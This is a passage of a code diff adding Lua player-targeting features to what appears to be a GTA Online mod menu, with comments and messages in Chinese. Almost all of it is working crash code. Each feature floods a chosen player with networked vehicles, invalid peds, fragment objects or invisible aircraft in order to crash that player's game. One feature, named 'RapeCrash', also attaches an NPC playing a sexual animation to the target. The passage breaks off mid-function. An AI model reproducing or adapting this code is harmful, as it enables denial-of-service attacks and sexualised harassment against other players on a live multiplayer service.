+                    local currentTarget = Players.GetCPed(playerId)
+                    if not currentTarget then break end
+                    local currentPos = currentTarget.Position
+                    local offsetX = (math.random() - 0.5) * 6.0
+                    local offsetY = (math.random() - 0.5) * 6.0
+                    local offsetZ = 0.5
+                    local spawnX = currentPos.x + offsetX
+                    local spawnY = currentPos.y + offsetY
+                    local spawnZ = currentPos.z + offsetZ
+                    local heading = math.random(0, 360)
+
+                    local veh = GTA.SpawnVehicle(trailerHash, spawnX, spawnY, spawnZ, heading, true, false)
+                    if veh and veh ~= 0 then
+                        table.insert(allEntities, veh)
+                        spawnCount = spawnCount + 1
+                        local netId = NETWORK.VEH_TO_NET(veh)
+                        if netId > 0 then
+                            NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netId, false)
+                            NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(netId, true)
+                        end
+                        if networkRQ(veh) then
+                            ENTITY.SET_ENTITY_COLLISION(veh, false, true)
+                            ENTITY.FREEZE_ENTITY_POSITION(veh, true)
+                            ENTITY.SET_ENTITY_INVINCIBLE(veh, true)
+                            VEHICLE.SET_VEHICLE_ENGINE_ON(veh, true, true, false)
+                        end
+                    end
+                    Script.Yield(10)
+                end
+                GUI.AddToast("拖车崩溃", string.format("🚛 已生成 %d 辆拖车", spawnCount), 2000, eToastPos.TOP_RIGHT)
+            end)
+
+            -- 2. 5次同步树崩溃（并发）
+            for i = 1, 5 do
+                Script.QueueJob(function()
+                    local objectHash = 1352295901
+                    STREAMING.REQUEST_MODEL(objectHash)
+                    local timeout = 0
+                    while not STREAMING.HAS_MODEL_LOADED(objectHash) and timeout < 200 do
+                        Script.Yield(10); timeout = timeout + 1
+                    end
+                    if not STREAMING.HAS_MODEL_LOADED(objectHash) then return end
+
+                    local currentTarget = Players.GetCPed(playerId)
+                    if not currentTarget then return end
+                    local curPos = currentTarget.Position
+
+                    local main_sync = GTA.CreateWorldObject(objectHash, curPos.x + 300, curPos.y + 300, curPos.z + 300, true, true)
+                    if main_sync then
+                        table.insert(allEntities, main_sync)
+                        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(main_sync)
+                        local sync_children = {
+                            849958566, -568220328, 2155335200, 1272323782, 1296557055,
+                            29828513, 2250084685, 2349112599, 1599985244, 3523942264,
+                            3457195100, 3762929870, 1016189997, 861098586, 3613262246,
+                            3245733464, 2494305715, 671173206, 3769155529, 978689073,
+                            100436592, 3107991431, 1327834842, 1239708330
+                        }
+                        for j = 1, #sync_children do
+                            STREAMING.REQUEST_MODEL(sync_children[j])
+                            local ct = 0
+                            while not STREAMING.HAS_MODEL_LOADED(sync_children[j]) and ct < 50 do
+                                Script.Yield(5); ct = ct + 1
+                            end
+                            if STREAMING.HAS_MODEL_LOADED(sync_children[j]) then
+                                local child = GTA.CreateWorldObject(sync_children[j], curPos.x + 300, curPos.y + 300, curPos.z + 300, true, true)
+                                if child then
+                                    table.insert(allEntities, child)
+                                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(child)
+                                    Natives.InvokeVoid(0x6B9BBD38AB0796DF, child, main_sync, 0, 0, 0, 0, 0, 0, 0, false, false, false, false, 2, true)
+                                end
+                            end
+                        end
+                        local time = Time.Get() + 1
+                        while time > Time.Get() do
+                            Script.Yield(math.random(0, 5))
+                            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(main_sync, curPos.x + math.random(-1, 1), curPos.y + math.random(-1, 1), curPos.z + math.random(-1, 1), false, false, false, false)
+                        end
+                    end
+                    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(objectHash)
+                end)
+                Script.Yield(10)
+            end
+
+            -- 3. 2次碎片崩溃
+            for i = 1, 2 do
+                local fragments = SpawnFragmentsAtPlayer(playerId, 30, allEntities)
+                Script.Yield(500)
+            end
+
+            -- 等待10秒后清理所有实体
+            Script.Yield(10000)
+            GUI.AddToast("拖车崩溃", string.format("🧹 开始清理 %d 个实体...", #allEntities), 2000, eToastPos.TOP_RIGHT)
+            for _, ent in ipairs(allEntities) do
+                if ENTITY.DOES_ENTITY_EXIST(ent) then
+                    deleteEnt(ent)
+                end
+                Script.Yield(5)
+            end
+            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(trailerHash)
+            collectgarbage("collect")
+            GUI.AddToast("拖车崩溃", "✅ 清理完成", 2000, eToastPos.TOP_RIGHT)
+        end)
+    end, true
+)
+
+-- ========== 自行车崩溃 ==========
+FeatureMgr.AddPlayerFeature(
+    Utils.Joaat("自行车崩溃"),
+    "自行车崩溃",
+    eFeatureType.Button,
+    "必须贴脸使用",
+    function(f)
+        local playerId = f:GetPlayerIndex()
+        if playerId == -1 then
+            GUI.AddToast("自行车崩溃", "❌ 请先选择一个玩家", 2000, eToastPos.BOTTOM_RIGHT)
+            return
+        end
+
+        Script.QueueJob(function()
+            local targetPed = Players.GetCPed(playerId)
+            if not targetPed then
+                GUI.AddToast("自行车崩溃", "❌ 无法获取目标玩家", 2000)
+                return
+            end
+
+            -- 预加载所需模型
+            local hash_janitor = Utils.Joaat("S_M_M_Janitor")
+            local hash_gunhook = Utils.Joaat("v_ilev_gunhook")
+            local hash_fixter = Utils.Joaat("fixter")
+            for _, hash in ipairs({hash_janitor, hash_gunhook, hash_fixter}) do
+                STREAMING.REQUEST_MODEL(hash)
+                local timeout = 0
+                while not STREAMING.HAS_MODEL_LOADED(hash) and timeout < 100 do
+                    Script.Yield(10)
+                    timeout = timeout + 1
+                end
+            end
+
+            local targetHandle = GTA.PointerToHandle(targetPed)
+            local forward = ENTITY.GET_ENTITY_FORWARD_VECTOR(targetHandle)
+            local spawnX = targetPed.Position.x + forward.x * 3.0
+            local spawnY = targetPed.Position.y + forward.y * 3.0
+            local spawnZ = targetPed.Position.z + 1.0
+
+            local janitor_ped = GTA.CreatePed(hash_janitor, 26, spawnX, spawnY, spawnZ, 0.0, true, true)
+            local obj = GTA.CreateObject(hash_gunhook, spawnX, spawnY, spawnZ, true, true)
+            local fixter = GTA.SpawnVehicle(hash_fixter, spawnX, spawnY, spawnZ, 0.0, true, true)
+
+            if janitor_ped == 0 or obj == 0 or fixter == 0 then
+                if janitor_ped ~= 0 then deleteEnt(janitor_ped) end
+                if obj ~= 0 then deleteEnt(obj) end
+                if fixter ~= 0 then deleteEnt(fixter) end
+                GUI.AddToast("自行车崩溃", "❌ 实体创建失败", 2000)
+                return
+            end
+
+            local entities = {janitor_ped, obj, fixter}
+            for _, ent in ipairs(entities) do
+                networkRQ(ent)
+                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, true, true)
+                local netId
+                if ENTITY.IS_ENTITY_A_PED(ent) then
+                    netId = NETWORK.PED_TO_NET(ent)
+                elseif ENTITY.IS_ENTITY_A_VEHICLE(ent) then
+                    netId = NETWORK.VEH_TO_NET(ent)
+                else
+                    netId = NETWORK.OBJ_TO_NET(ent)
+                end
+                if netId and netId > 0 then
+                    NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netId, false)
+                    NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(netId, true)
+                end
+            end
+
+            PED.SET_PED_TO_RAGDOLL(janitor_ped, 99999, 0, 0, false, false, false)
+            Script.Yield(500)
+
+            ENTITY.ATTACH_ENTITY_TO_ENTITY(obj, janitor_ped, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, true, true, true, false, 0, true, 2)
+            ENTITY.ATTACH_ENTITY_TO_ENTITY(fixter, obj, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, true, true, true, false, 0, true, 2)
+
+            Script.Yield(1000)
+
+            for _, ent in ipairs(entities) do
+                deleteEnt(ent)
+            end
+
+            GUI.AddToast("自行车崩溃", "✅ 已完成（贴脸多点几下效果最佳）", 3000, eToastPos.TOP_RIGHT)
+        end)
+    end,
+    true
+)
+
+-- ========== 无效ped崩溃 ==========
+FeatureMgr.AddPlayerFeature(
+    Utils.Joaat("无效ped"),
+    "无效ped崩溃",
+    eFeatureType.Button,
+    "⚠️ 不要观看目标，否则自崩！直接在目标玩家位置生成无效人物（距离过近自动传送）",
+    function(f)
+        local playerId = f:GetPlayerIndex()
+        if playerId == -1 then
+            GUI.AddToast("无效ped崩", "❌ 请先选择一个玩家", 2000, eToastPos.BOTTOM_RIGHT)
+            return
+        end
+
+        local targetCPed = Players.GetCPed(playerId)
+        if not targetCPed then
+            GUI.AddToast("无效ped同步崩", "❌ 无法获取目标玩家", 2000, eToastPos.BOTTOM_RIGHT)
+            return
+        end
+
+        local function teleportIfTooClose()
+            local localPed = GTA.GetLocalPed()
+            if not localPed then return end
+
+            local localPos = localPed.Position
+            local targetPos = targetCPed.Position
+            local dx = localPos.x - targetPos.x
+            local dy = localPos.y - targetPos.y
+            local dz = localPos.z - targetPos.z
+            local dist = math.sqrt(dx*dx + dy*dy + dz*dz)
+
+            if dist < 600.0 then
+                local newX = targetPos.x + 600.0
+                local newY = targetPos.y
+                local newZ = targetPos.z
+
+                local groundFound, groundZ = GTA.GetGroundZ(newX, newY)
+                if groundFound then
+                    newZ = groundZ + 1.0
+                end
+
+                local pedHandle = GTA.PointerToHandle(localPed)
+                if pedHandle and pedHandle ~= 0 then
+                    Natives.InvokeVoid(0x06843DA7060A026B, pedHandle, newX, newY, newZ, false, false, false, false)
+                    Script.Yield(100)
+                end
+            end
+        end
+
+        local nullPeds = {
+            Utils.Joaat("slod_human"),
+            Utils.Joaat("slod_large_quadped"),
+            Utils.Joaat("slod_small_quadped"),
+            Utils.Joaat("player_zero"),
+            Utils.Joaat("player_one"),
+            Utils.Joaat("player_two"),
+            Utils.Joaat("mp_m_freemode_01"),
+            Utils.Joaat("mp_f_freemode_01")
+        }
+
+        local function executeCrash(taskId)
+            Script.QueueJob(function()
+                local target = Players.GetCPed(playerId)
+                if not target then
+                    GUI.AddToast("无效ped崩", "⚠️ 目标已离开，任务终止", 1000)
+                    return
+                end
+
+                local targetPos = target.Position
+
+                for round = 1, 5 do
+                    target = Players.GetCPed(playerId)
+                    if not target then break end
+                    targetPos = target.Position
+
+                    for _, modelHash in ipairs(nullPeds) do
+                        Natives.InvokeVoid(0x963D27A58DF860AC, modelHash)
+                        Script.Yield(200)
+
+                        local ped = GTA.CreatePed(modelHash, 26, targetPos.x, targetPos.y, targetPos.z + 1.0, 0.0, true, false)
+                        if ped ~= 0 then
+                            Natives.InvokeVoid(0xAD738C3085FE7E11, ped, true, true)
+                            Script.Yield(30)
+
+                            local pedPtr = Memory.AllocInt()
+                            Memory.WriteInt(pedPtr, ped)
+                            Natives.InvokeVoid(0xAE3CBE5BF394C9C9, pedPtr)
+                            Memory.Free(pedPtr)
+                        end
+
+                        Natives.InvokeVoid(0x0F07E7745A236711, modelHash)
+                        Script.Yield(10)
+                    end
+
+                    Script.Yield(100)
+                end
+
+                GUI.AddToast("无效ped崩", "✅ 第 " .. taskId .. " 次执行完成", 1500, eToastPos.TOP_RIGHT)
+            end)
+        end
+
+        Script.QueueJob(function()
+            teleportIfTooClose()
+            Script.Yield(50)
+            executeCrash(1)
+            executeCrash(2)
+            GUI.AddToast("无效ped崩", "🚀 已同时启动两次崩溃任务", 2000, eToastPos.TOP_RIGHT)
+        end)
+    end,
+    true
+)
+
+-- ========== 指南针崩溃 ==========
+FeatureMgr.AddPlayerFeature(
+    0xA1B2C3D4,
+    "指南针崩溃",
+    eFeatureType.Button,
+    "必须贴脸使用",
+    function(f)
+        local playerId = f:GetPlayerIndex()
+        if playerId == -1 then
+            GUI.AddToast("指南针崩溃", "❌ 请先选择一个玩家", 2000, eToastPos.BOTTOM_RIGHT)
+            return
+        end
+
+        Script.QueueJob(function()
+            local targetPed = Players.GetCPed(playerId)
+            if not targetPed then
+                GUI.AddToast("指南针崩溃", "❌ 无法获取目标玩家", 2000)
+                return
+            end
+
+            local hash_janitor = 0x8D8F1B10
+            local hash_gunhook = Utils.Joaat("v_ilev_gunhook")
+            local hash_fixter = Utils.Joaat("fixter")
+            for _, hash in ipairs({hash_janitor, hash_gunhook, hash_fixter}) do
+                STREAMING.REQUEST_MODEL(hash)
+                local timeout = 0
+                while not STREAMING.HAS_MODEL_LOADED(hash) and timeout < 100 do
+                    Script.Yield(10)
+                    timeout = timeout + 1
+                end
+            end
+
+            GUI.AddToast("指南针崩溃", "🚀 开始执行30次循环...", 2000, eToastPos.TOP_RIGHT)
+
+            local targetHandle = GTA.PointerToHandle(targetPed)
+            local forward = ENTITY.GET_ENTITY_FORWARD_VECTOR(targetHandle)
+
+            for cycle = 1, 30 do
+                targetPed = Players.GetCPed(playerId)
+                if not targetPed then
+                    GUI.AddToast("指南针崩溃", "⚠️ 目标已离开，提前结束", 2000)
+                    break
+                end
+
+                targetHandle = GTA.PointerToHandle(targetPed)
+                forward = ENTITY.GET_ENTITY_FORWARD_VECTOR(targetHandle)
+                local spawnX = targetPed.Position.x + forward.x * 3.0
+                local spawnY = targetPed.Position.y + forward.y * 3.0
+                local spawnZ = targetPed.Position.z + 1.0
+
+                local janitor_ped = GTA.CreatePed(hash_janitor, 26, spawnX, spawnY, spawnZ, 0.0, true, true)
+                local obj = GTA.CreateObject(hash_gunhook, spawnX, spawnY, spawnZ, true, true)
+                local fixter = GTA.SpawnVehicle(hash_fixter, spawnX, spawnY, spawnZ, 0.0, true, true)
+
+                if janitor_ped ~= 0 and obj ~= 0 and fixter ~= 0 then
+                    local entities = {janitor_ped, obj, fixter}
+                    for _, ent in ipairs(entities) do
+                        networkRQ(ent)
+                        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, true, true)
+                        local netId
+                        if ENTITY.IS_ENTITY_A_PED(ent) then
+                            netId = NETWORK.PED_TO_NET(ent)
+                        elseif ENTITY.IS_ENTITY_A_VEHICLE(ent) then
+                            netId = NETWORK.VEH_TO_NET(ent)
+                        else
+                            netId = NETWORK.OBJ_TO_NET(ent)
+                        end
+                        if netId and netId > 0 then
+                            NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netId, false)
+                            NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(netId, true)
+                        end
+                    end
+
+                    PED.SET_PED_TO_RAGDOLL(janitor_ped, 99999, 0, 0, false, false, false)
+                    ENTITY.SET_ENTITY_VISIBLE(fixter, false, false)
+
+                    Script.Yield(100)
+
+                    ENTITY.ATTACH_ENTITY_TO_ENTITY(obj, janitor_ped, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, true, true, true, false, 0, true, 2)
+                    ENTITY.ATTACH_ENTITY_TO_ENTITY(fixter, obj, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, true, true, true, false, 0, true, 2)
+
+                    Script.Yield(1000)
+
+                    for _, ent in ipairs(entities) do
+                        deleteEnt(ent)
+                    end
+                else
+                    if janitor_ped ~= 0 then deleteEnt(janitor_ped) end
+                    if obj ~= 0 then deleteEnt(obj) end
+                    if fixter ~= 0 then deleteEnt(fixter) end
+                end
+
+                if cycle % 10 == 0 then
+                    GUI.AddToast("指南针崩溃", string.format("进度: %d/30", cycle), 1000, eToastPos.TOP_RIGHT)
+                end
+            end
+
+            GUI.AddToast("指南针崩溃", "✅ 30次循环执行完毕", 3000, eToastPos.TOP_RIGHT)
+        end)
+    end,
+    true
+)
+
+-- ========== 啪啪啪崩溃 ==========
+FeatureMgr.AddPlayerFeature(
+    Utils.Joaat("RapeCrash"),
+    "啪啪啪崩溃",
+    eFeatureType.Button,
+    "5次碎片 + 120辆隐形载具 + 啪啪啪NPC",
+    function(f)
+        local playerId = f:GetPlayerIndex()
+        
+        Script.QueueJob(function()
+            GUI.AddToast("啪啪啪崩溃", "🔄 开始啪啪啪崩溃攻击...", 3000, eToastPos.TOP_RIGHT)
+            
+            local targetPed = Players.GetCPed(playerId)
+            if not targetPed then
+                GUI.AddToast("啪啪啪崩溃", "❌ 无法获取目标玩家实体", 3000)
+                return
+            end
+            
+            local pos = targetPed.Position
+            local targetHandle = GTA.PointerToHandle(targetPed)
+            local allEntities = {}
+            
+            -- ========== 阶段1：5次碎片崩溃 ==========
+            GUI.AddToast("啪啪啪崩溃", "⚡ 执行5次碎片崩溃", 2000, eToastPos.TOP_RIGHT)
+            for i = 1, 5 do
+                local fragments = SpawnFragmentsAtPlayer(playerId, 30, allEntities)
+                Script.Yield(500)
+            end
+            
+            -- ========== 在碎片执行期间生成啪啪啪NPC ==========
+            Script.QueueJob(function()
+                local rapeHash = -781039234
+                STREAMING.REQUEST_MODEL(rapeHash)
+                local timeout = 0
+                while not STREAMING.HAS_MODEL_LOADED(rapeHash) and timeout < 100 do
+                    Script.Yield(10)
+                    timeout = timeout + 1
+                end
+                
+                if STREAMING.HAS_MODEL_LOADED(rapeHash) and targetPed then
+                    local spawnX = pos.x + math.random(-2, 2)
+                    local spawnY = pos.y + math.random(-2, 2)
+                    local spawnZ = pos.z + 0.5
+                    local rapePed = GTA.CreatePed(rapeHash, 26, spawnX, spawnY, spawnZ, 0.0, true, false)
+                    
+                    if rapePed and rapePed ~= 0 then
+                        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(rapePed, true, true)
+                        ENTITY.SET_ENTITY_INVINCIBLE(rapePed, true)
+                        
+                        STREAMING.REQUEST_ANIM_DICT("rcmpaparazzo_2")
+                        local animTimeout = 0
+                        while not STREAMING.HAS_ANIM_DICT_LOADED("rcmpaparazzo_2") and animTimeout < 100 do
+                            Script.Yield(10)
+                            animTimeout = animTimeout + 1
+                        end
+                        
+                        ENTITY.ATTACH_ENTITY_TO_ENTITY(
+                            rapePed, targetHandle, 0,
+                            0.0, -0.5, 0.2,
+                            2.0, 1.0, 1.0,
+                            true, true, true, false, 0, true
+                        )
+                        
+                        if STREAMING.HAS_ANIM_DICT_LOADED("rcmpaparazzo_2") then
+                            TASK.TASK_PLAY_ANIM(
+                                rapePed, "rcmpaparazzo_2", "shag_loop_a",
+                                3.0, 2.0, -1, 3, 1.0,
+                                false, false, false
+                            )
+                        end
+                        
+                        Script.QueueJob(function()
+                            Script.Yield(10000)
+                            if ENTITY.DOES_ENTITY_EXIST(rapePed) then
+                                deleteEnt(rapePed)
+                            end
+                        end)
+                    end
+                end
+                STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(rapeHash)
+            end)
+            
+            Script.Yield(2000)
+            
+            -- ========== 阶段2：生成120辆载具（外圈Hunter + 内圈avenger2，带隐形效果） ==========
+            GUI.AddToast("啪啪啪崩溃", "🚁 开始生成隐形载具", 2000, eToastPos.TOP_RIGHT)
+            local hunterHash = -42959138
+            local avenger2Hash = 408970549
+            
+            STREAMING.REQUEST_MODEL(hunterHash)
+            STREAMING.REQUEST_MODEL(avenger2Hash)
+            local modelTimeout = 0
+            while (not STREAMING.HAS_MODEL_LOADED(hunterHash) or not STREAMING.HAS_MODEL_LOADED(avenger2Hash)) and modelTimeout < 150 do
+                Script.Yield(5)
+                modelTimeout = modelTimeout + 1
+            end
+            if not STREAMING.HAS_MODEL_LOADED(hunterHash) or not STREAMING.HAS_MODEL_LOADED(avenger2Hash) then
+                GUI.AddToast("啪啪啪崩溃", "❌ 模型加载失败", 3000)
+                return
+            end
+            
+            local vehs = {}
+            local baseZ = pos.z
+            
+            -- 外圈Hunter（隐形）
+            for i = 1, 60 do
+                local angle = (i / 60) * 360
+                local rad = angle * (math.pi / 180)
+                local spawnX = pos.x + 10.0 * math.cos(rad)
+                local spawnY = pos.y + 10.0 * math.sin(rad)
+                local dx = pos.x - spawnX
+                local dy = pos.y - spawnY
+                local targetHeading = (math.deg(atan2(dy, dx)) - 90) % 360
+                local vehicle = GTA.SpawnVehicle(hunterHash, spawnX, spawnY, baseZ, targetHeading, true, false)
+                if ENTITY.DOES_ENTITY_EXIST(vehicle) then
+                    table.insert(vehs, vehicle)
+                    table.insert(allEntities, vehicle)
+                    local netId = NETWORK.VEH_TO_NET(vehicle)
+                    if netId > 0 then
+                        NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netId, false)
+                        NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(netId, true)
+                    end
+                    if networkRQ(vehicle) then
+                        ENTITY.SET_ENTITY_COLLISION(vehicle, false, true)
+                        ENTITY.FREEZE_ENTITY_POSITION(vehicle, true)
+                        ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
+                        VEHICLE.SET_VEHICLE_ENGINE_ON(vehicle, true, true, false)
+                        VEHICLE.SET_VEHICLE_KEEP_ENGINE_ON_WHEN_ABANDONED(vehicle, true)
+                        ENTITY.SET_ENTITY_VISIBLE(vehicle, false, false)
+                    end
+                    if i % 5 == 0 then Script.Yield(1) end
+                end
+            end
+            
+            -- 内圈avenger2（隐形）
+            for i = 1, 60 do
+                local angle = ((i + 0.5) / 60) * 360
+                local rad = angle * (math.pi / 180)
+                local spawnX = pos.x + 5.0 * math.cos(rad)
+                local spawnY = pos.y + 5.0 * math.sin(rad)
+                local dx = pos.x - spawnX
+                local dy = pos.y - spawnY
+                local targetHeading = (math.deg(atan2(dy, dx)) - 90) % 360
+                local vehicle = GTA.SpawnVehicle(avenger2Hash, spawnX, spawnY, baseZ, targetHeading, true, false)
+                if ENTITY.DOES_ENTITY_EXIST(vehicle) then
+                    table.insert(vehs, vehicle)
+                    table.insert(allEntities, vehicle)
+                    local netId = NETWORK.VEH_TO_NET(vehicle)
+                    if netId > 0 then
+                        NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netId, false)
+                        NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(netId, true)
+                    end
+                    if networkRQ(vehicle) then
+                        ENTITY.SET_ENTITY_COLLISION(vehicle, false, true)
+                        ENTITY.FREEZE_ENTITY_POSITION(vehicle, true)
+                        ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
+                        VEHICLE.SET_VEHICLE_ENGINE_ON(vehicle, true, true, false)
+                        VEHICLE.SET_VEHICLE_KEEP_ENGINE_ON_WHEN_ABANDONED(vehicle, true)
+                        ENTITY.SET_ENTITY_VISIBLE(vehicle, false, false)
+                    end
+                    if i % 5 == 0 then Script.Yield(1) end
+                end
+            end
+            
+            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hunterHash)
+            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(avenger2Hash)
+            GUI.AddToast("啪啪啪崩溃", "✅ 啪啪啪崩溃完成！", 3000, eToastPos.TOP_RIGHT)
+            
+            -- 10秒后清理所有实体
+            Script.Yield(10000)
+            GUI.AddToast("啪啪啪崩溃", "开始清理所有实体...", 2000)
+            for _, ent in ipairs(allEntities) do
+                if ENTITY.DOES_ENTITY_EXIST(ent) then
+                    deleteEnt(ent)
+                end
+                Script.Yield(5)
+            end
+            collectgarbage("collect")
+        end)
+    end,
+    true
+)
+
+-- ========== 复仇者崩溃 ==========
+FeatureMgr.AddPlayerFeature(
+    Utils.Joaat("AvengerCrash"),
+    "复仇者崩溃",
+    eFeatureType.Button,
+    "围绕玩家生成50架启动状态的复仇者直升机 + 10次碎片崩溃，10秒后自动清理",
+    function(f)
+        local playerId = f:GetPlayerIndex()
+        if playerId == -1 then
+            GUI.AddToast("复仇者崩溃", "❌ 请先选择一个玩家", 2000, eToastPos.BOTTOM_RIGHT)
+            return
+        end
+
+        Script.QueueJob(function()
+            local targetPed = Players.GetCPed(playerId)
+            if not targetPed then
+                GUI.AddToast("复仇者崩溃", "❌ 无法获取目标玩家", 2000)
+                return
+            end
+
+            local pos = targetPed.Position
+            local allEntities = {}
+
+            -- 复仇者模型哈希
+            local avengerHash = 408970549  -- avenger2
+            local radius = 12.0
+
+            -- 预加载复仇者模型
+            STREAMING.REQUEST_MODEL(avengerHash)
+            local timeout = 0
+            while not STREAMING.HAS_MODEL_LOADED(avengerHash) and timeout < 200 do
+                Script.Yield(10)
+                timeout = timeout + 1
+            end
+            if not STREAMING.HAS_MODEL_LOADED(avengerHash) then
+                GUI.AddToast("复仇者崩溃", "❌ 复仇者模型加载失败", 3000)
+                return
+            end
+
+            GUI.AddToast("复仇者崩溃", "🚁 开始生成50架复仇者并执行10次碎片崩溃", 3000, eToastPos.TOP_RIGHT)
+
+            -- 1. 生成50架复仇者（圆形排列，引擎启动）
+            local successCount = 0
+            for i = 1, 50 do
+                local angle = (i / 50) * 360
+                local rad = angle * (math.pi / 180)
+                local spawnX = pos.x + radius * math.cos(rad)
+                local spawnY = pos.y + radius * math.sin(rad)
+                local spawnZ = pos.z + 8.0   -- 抬高8米，避免卡地
+                local heading = angle         -- 朝向圆心
+
+                local vehicle = GTA.SpawnVehicle(avengerHash, spawnX, spawnY, spawnZ, heading, true, false)
+                if vehicle and vehicle ~= 0 then
+                    table.insert(allEntities, vehicle)
+                    successCount = successCount + 1
+                    local netId = NETWORK.VEH_TO_NET(vehicle)
+                    if netId > 0 then
+                        NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netId, false)
+                        NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(netId, true)
+                    end
+                    if networkRQ(vehicle) then
+                        ENTITY.SET_ENTITY_COLLISION(vehicle, true, true)
+                        ENTITY.FREEZE_ENTITY_POSITION(vehicle, true)
+                        ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
+                        VEHICLE.SET_VEHICLE_ENGINE_ON(vehicle, true, true, false)
+                        VEHICLE.SET_VEHICLE_KEEP_ENGINE_ON_WHEN_ABANDONED(vehicle, true)
+                    end
+                end
+                if i % 10 == 0 then Script.Yield(5) end
+            end
+            GUI.AddToast("复仇者崩溃", string.format("✅ 已生成 %d/50 架复仇者", successCount), 2000, eToastPos.TOP_RIGHT)
+
+            -- 2. 并发执行10次碎片崩溃
+            for i = 1, 10 do
+                local fragments = SpawnFragmentsAtPlayer(playerId, 30, allEntities)
+                Script.Yield(100)
+            end
+            GUI.AddToast("复仇者崩溃", "💥 已启动10次碎片崩溃", 2000, eToastPos.TOP_RIGHT)
+
+            -- 等待10秒后清理所有实体
+            Script.Yield(10000)
+            GUI.AddToast("复仇者崩溃", string.format("🧹 开始清理 %d 个实体...", #allEntities), 2000, eToastPos.TOP_RIGHT)
+            for _, ent in ipairs(allEntities) do
+                if ENTITY.DOES_ENTITY_EXIST(ent) then
+                    deleteEnt(ent)
+                end
+                Script.Yield(5)
+            end
+            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(avengerHash)
+            collectgarbage("collect")
+            GUI.AddToast("复仇者崩溃", "✅ 清理完成", 2000, eToastPos.TOP_RIGHT)
+        end)
+    end,
+    true
+)
+
+-- ========== 美杜莎崩溃 ==========
+FeatureMgr.AddPlayerFeature(
+    Utils.Joaat("MedusaCrash"),
+    "美杜莎崩溃",
+    eFeatureType.Button,
+    "缓慢在玩家头顶高处生成1077420264哈希值载具，设置固定位置冻结效果",
+    function(f)
+        local playerId = f:GetPlayerIndex()
+        if playerId == -1 then
+            GUI.AddToast("美杜莎崩溃", "❌ 请先选择一个玩家", 2000, eToastPos.BOTTOM_RIGHT)
+            return
+        end
+
+        Script.QueueJob(function()
+            GUI.AddToast("美杜莎崩溃", "🐍 美杜莎之眼已睁开，开始生成载具...", 3000, eToastPos.TOP_RIGHT)
+            
+            local targetPed = Players.GetCPed(playerId)
+            if not targetPed then
+                GUI.AddToast("美杜莎崩溃", "❌ 无法获取目标玩家", 2000)
+                return
+            end
+            
+            local vehHash = 1077420264  -- 美杜莎载具哈希值
+            
+            -- 加载模型
+            STREAMING.REQUEST_MODEL(vehHash)
+            local timeout = 0
+            while not STREAMING.HAS_MODEL_LOADED(vehHash) and timeout < 100 do
+                Script.Yield(10)
+                timeout = timeout + 1
+            end
+            if not STREAMING.HAS_MODEL_LOADED(vehHash) then
+                GUI.AddToast("美杜莎崩溃", "❌ 美杜莎模型加载失败", 2000)
+                return
+            end
+            
+            local vehicles = {}
+            local count = 120  -- 生成120个载具
+            local successCount = 0
+            local failedCount = 0
+            
+            -- 获取目标玩家初始位置，固定生成位置（不随玩家移动）
+            local fixedTargetPos = targetPed.Position
+            local spawnX = fixedTargetPos.x
+            local spawnY = fixedTargetPos.y
+            local spawnZ = fixedTargetPos.z + 80.0  -- 固定在头顶80米高处
+            
+            -- 固定朝向（所有载具朝向一致）
+            local fixedHeading = 0.0
+            
+            for i = 1, count do
+                -- 完全重叠生成（相同位置、相同朝向）
+                local vehicle = GTA.SpawnVehicle(vehHash, spawnX, spawnY, spawnZ, fixedHeading, true, false)
+                if vehicle and vehicle ~= 0 then
+                    table.insert(vehicles, vehicle)
+                    successCount = successCount + 1
+                    
+                    -- 强制获取网络控制权
+                    local netId = NETWORK.VEH_TO_NET(vehicle)
+                    if netId > 0 then
+                        NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netId, false)
+                        NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(netId, true)
+                    end
+                    
+                    -- 等待获取控制权
+                    if networkRQ(vehicle) then
+                        -- 启用碰撞和物理，不冻结
+                        ENTITY.SET_ENTITY_COLLISION(vehicle, true, true)
+                        ENTITY.SET_ENTITY_HAS_GRAVITY(vehicle, true)
+                        ENTITY.FREEZE_ENTITY_POSITION(vehicle, false)
+                        
+                        -- 设置载具完全损坏
+                        VEHICLE.SET_VEHICLE_ENGINE_HEALTH(vehicle, -4000.0)
+                        VEHICLE.SET_VEHICLE_BODY_HEALTH(vehicle, 0.0)
+                        VEHICLE.SET_VEHICLE_PETROL_TANK_HEALTH(vehicle, -4000.0)
+                        
+                        -- 破坏所有车门
+                        for doorId = 0, 6 do
+                            VEHICLE.SET_VEHICLE_DOOR_BROKEN(vehicle, doorId, true)
+                        end
+                        
+                        -- 获取载具位置用于爆炸
+                        local vehPos = ENTITY.GET_ENTITY_COORDS(vehicle, true)
+                        
